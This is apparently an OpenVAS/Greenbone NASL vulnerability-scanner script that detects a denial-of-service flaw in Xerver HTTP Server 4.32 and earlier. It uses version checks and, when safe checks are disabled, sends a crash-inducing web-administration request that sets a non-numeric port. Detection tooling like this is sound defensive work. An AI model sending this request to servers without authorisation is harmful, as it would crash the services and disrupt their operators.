if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.800175" );
	script_version( "2021-05-17T11:26:07+0000" );
	script_tag( name: "last_modification", value: "2021-05-17 11:26:07 +0000 (Mon, 17 May 2021)" );
	script_tag( name: "creation_date", value: "2010-03-10 15:48:25 +0100 (Wed, 10 Mar 2010)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_bugtraq_id( 36454 );
	script_cve_id( "CVE-2009-4658", "CVE-2009-4657" );
	script_name( "Xerver HTTP Server Web Administration DoS Vulnerability" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/53351" );
	script_xref( name: "URL", value: "http://www.milw0rm.com/exploits/9717" );
	script_tag( name: "qod_type", value: "remote_banner" );
	script_category( ACT_MIXED_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "gb_xerver_http_server_detect.sc" );
	script_require_ports( "Services/www", 32123, 80 );
	script_mandatory_keys( "xerver/detected" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to cause a DoS or
  execute arbitrary code." );
	script_tag( name: "affected", value: "Xerver version 4.32 and prior on all platforms." );
	script_tag( name: "insight", value: "The flaw is due to improper validation of user supplied input
  passed to HTTP server port via Web Administration Wizard. An attacker can set HTTP Server port to
  any kind of letter combination causing server crash." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one." );
	script_tag( name: "summary", value: "Xerver HTTP Server is prone to a denial of service (DoS)
  vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
require("version_func.inc.sc");
port = http_get_port( default: 32123 );
vers = get_kb_item( "www/" + port + "/Xerver" );
if(isnull( vers )){
	exit( 0 );
}
if(!safe_checks() && !http_is_dead( port: port )){
	url = "/?action=wizardStep2&direction=forward&save=yes&portNr=VT_Exploit_Replace_With_Port_Num&allowFolderListing=1&shareHiddenFiles=1&allowCGIScript=1";
	req = http_get( item: url, port: port );
	http_send_recv( port: port, data: req );
	if(http_is_dead( port: port )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
if(version_is_less_equal( version: vers, test_version: "4.32" )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

